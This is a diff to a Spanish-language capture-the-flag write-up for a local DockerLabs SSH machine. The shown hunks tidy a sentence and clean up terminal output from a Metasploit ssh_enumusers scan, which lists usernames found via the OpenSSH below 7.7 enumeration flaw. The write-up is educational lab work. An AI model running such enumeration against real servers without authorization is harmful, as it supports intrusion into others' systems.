@@ -50,7 +50,7 @@ OpenSSH < 7.7 - User Enumeration (2)                                            
 Shellcodes: No Results
 
 ```
-Podriamos descarganos los tres scripts, pero yo lo hare con metasploit para la enumeracion de usuarios.
+Podriamos descarganos cualquiera de los tres scrips para automatizar la tarea, pero yo lo hare con metasploit para la enumeracion de usuarios.
 
 ```
 ──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/breakmyssh]
@@ -65,7 +65,7 @@ msf auxiliary(scanner/ssh/ssh_enumusers) > run
 [*] 172.17.0.2:22 - SSH - Using malformed packet technique
 [*] 172.17.0.2:22 - SSH - Checking for false positives
 [*] 172.17.0.2:22 - SSH - Starting scan
-^[[A^[[A^[[A[+] 172.17.0.2:22 - SSH - User 'backup' found
+[+] 172.17.0.2:22 - SSH - User 'backup' found
 [+] 172.17.0.2:22 - SSH - User 'games' found
 [+] 172.17.0.2:22 - SSH - User 'irc' found
 [+] 172.17.0.2:22 - SSH - User 'mail' found
